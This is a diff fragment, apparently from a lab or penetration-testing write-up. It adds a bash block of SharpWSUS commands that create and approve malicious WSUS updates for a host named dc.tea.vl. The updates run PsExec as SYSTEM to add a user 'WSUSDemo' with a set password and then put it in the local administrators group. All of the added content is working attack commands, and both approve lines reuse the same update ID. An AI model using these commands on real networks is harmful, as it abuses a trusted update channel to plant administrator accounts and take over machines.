@@ -42,4 +42,10 @@ Unassigned Computers
 
 
 
+```bash
+SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net user WSUSDemo Password123! /add\"" /title:"WSUSDemo1"
+SharpWSUS_update.exe approve /updateid:c59e59aa-1847-40c1-bdf1-7ac122c8c822 /computername:dc.tea.vl /groupname:"Demo Group1"
 
+SharpWSUS_update.exe create /payload:"c:\_install\PsExec64.exe" /args:"-accepteula -s -d cmd.exe /c \"net localgroup administrators WSUSDemo /add\"" /title:"WSUSDemo2"
+SharpWSUS_update.exe approve /updateid:c59e59aa-1847-40c1-bdf1-7ac122c8c822 /computername:dc.tea.vl /groupname:"Demo Group2"
+```
